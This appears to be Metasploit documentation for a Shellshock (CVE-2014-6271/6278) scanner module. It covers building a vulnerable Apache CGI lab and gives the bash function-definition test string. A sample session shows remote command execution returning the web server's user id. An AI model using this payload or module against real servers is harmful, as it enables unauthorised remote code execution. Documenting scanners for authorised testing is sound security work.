## Vulnerable Application

This module scans for the Shellshock vulnerability, a flaw in how the Bash shell handles external
 environment variables. This module targets CGI scripts in the Apache web server by setting
 the HTTP_USER_AGENT environment variable to a malicious function definition.

### Creating a Vulnerable Environment
To setup an Environment that the scanner can be run against, follow the below steps to install a
 vulnerable OS and Apache version.

  To ensure that you have a vulnerable version of bash:
  1. Install Ubuntu 12.04.5 LTS from ISO (available at: http://cdimage.ubuntu.com/releases/12.04/release/)
  2. log into console
  3. run
```
env 'x=() { :;}; echo vulnerable' 'BASH_FUNC_x()=() { :;}; echo vulnerable' bash -c "echo test"
```
  4. The shell will return the below text to confirm that the environment is vulnerable
```
vulnerable
bash: BASH_FUNC_x(): line 0: syntax error near unexpected token `)'
bash: BASH_FUNC_x(): line 0: `BASH_FUNC_x() () { :;}; echo vulnerable'
bash: error importing function definition for `BASH_FUNC_x'
test
```
(NOTE: The next series of commands should be run as root or with sudo) <br>
5. Also install Apache2 from the apt repository with the following command
```
apt-get install apache2
```
  6. Enable cgi-mod in apache with the following command
```
ln -s /etc/apache2/mods-available/cgi.load /etc/apache2/mods-enabled/cgi.load
```
  7. Restart the apache service with the following command
```
service apache2 reload
```
  8. In your favorite text editor create a file (as root) in /usr/lib/cgi-bin called test.sh with the following contents
```
#!/bin/bash
printf "Content-type: text/html\n\n"
printf "Test!\n"
```
  9. Set the file to be executable with the following command
```
chmod +x /usr/lib/cgi-bin/test.sh
```

### To check if a host is vulnerable to the attack
1. run (on the host)
```
env 'x=() { :;}; echo vulnerable' 'BASH_FUNC_x()=() { :;}; echo vulnerable' bash -c "echo test"
```
2. The shell will return the below text if the environment is vulnerable
``` 
vulnerable
bash: BASH_FUNC_x(): line 0: syntax error near unexpected token `)'   
bash: BASH_FUNC_x(): line 0: `BASH_FUNC_x() () { :;}; echo vulnerable'
bash: error importing function definition for `BASH_FUNC_x'
test
```

## Verification Steps
1. Do: run `msfconsole`
2. Do: use `auxiliary/scanner/http/apache_mod_cgi_bash_env'
2. Do: set `RHOSTS [IP]`
3. Do: set `TARGETURI [URI]`
4. Do: `run`

## Options
1. `CMD`. The default setting is /usr/bin/id
2. `CVE`. The default setting is `CVE-2014-6271` but valid options are CVE-2014-6271 or CVE-2014-6278
3. `HEADER`. The default setting is User-Agent
4. `METHOD`. The default setting is GET

## Scenarios
### Ubuntu 12.04.5 LTS on Apache 2.2.22
  ```
msf5 > use auxiliary/scanner/http/apache_mod_cgi_bash_env
msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set RHOSTS 172.16.131.134
RHOSTS => 172.16.131.134
msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set TARGETURI /cgi-bin/test.sh
TARGETURI => /cgi-bin/test.sh
msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > exploit

[+] uid=33(www-data) gid=33(www-data) groups=33(www-data)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
  ```

